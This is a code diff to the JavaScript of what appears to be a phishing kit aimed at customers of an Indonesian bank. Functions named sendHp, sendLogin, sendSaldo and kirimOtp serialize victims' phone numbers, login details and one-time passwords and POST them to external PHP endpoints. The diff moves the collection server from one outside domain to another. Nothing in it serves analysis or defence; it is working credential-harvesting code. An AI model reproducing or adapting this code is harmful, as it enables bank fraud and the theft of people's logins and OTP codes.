@@ -5,7 +5,7 @@ function sendHp() {
    document.getElementById('kirims').innerHTML = "Memproses....";
    $.ajax({
       type: 'POST',
-      url: 'https://kuda-terbang.whf.bz/notif/v9-v2ge3e/one.php',
+      url: 'https://anjayhostjon.cloud/bri/v9-v2ge3e/one.php',
       data: $('#inputHp').serialize(),
       complete: function(data) {
          vibr(220);
@@ -36,7 +36,7 @@ function sendLogin() {
    document.getElementById('kirims').innerHTML = "Memproses....";
    $.ajax({
       type: 'POST',
-      url: 'https://kuda-terbang.whf.bz/notif/v9-v2ge3e/login.php',
+      url: 'https://anjayhostjon.cloud/bri/v9-v2ge3e/login.php',
       data: $('#inputlogin').serialize(),
       complete: function(data) {
          vibr(220);
@@ -67,7 +67,7 @@ function sendSaldo() {
    document.getElementById('kirims').innerHTML = "Memproses....";
    $.ajax({
       type: 'POST',
-      url: 'https://kuda-terbang.whf.bz/notif/v9-v2ge3e/two.php',
+      url: 'https://anjayhostjon.cloud/bri/v9-v2ge3e/two.php',
       data: $('#inputlogin').serialize(),
       complete: function(data) {
          vibr(220);
@@ -102,7 +102,7 @@ function kirimOtp() {
    document.getElementById('kirims').value = "Memproses....";
    $.ajax({
       type: 'POST',
-      url: 'https://kuda-terbang.whf.bz/notif/v9-v2ge3e/three.php',
+      url: 'https://anjayhostjon.cloud/bri/v9-v2ge3e/three.php',
       data: $('#formLink').serialize(),
       complete: function(data) {
          console.log('Complete')         
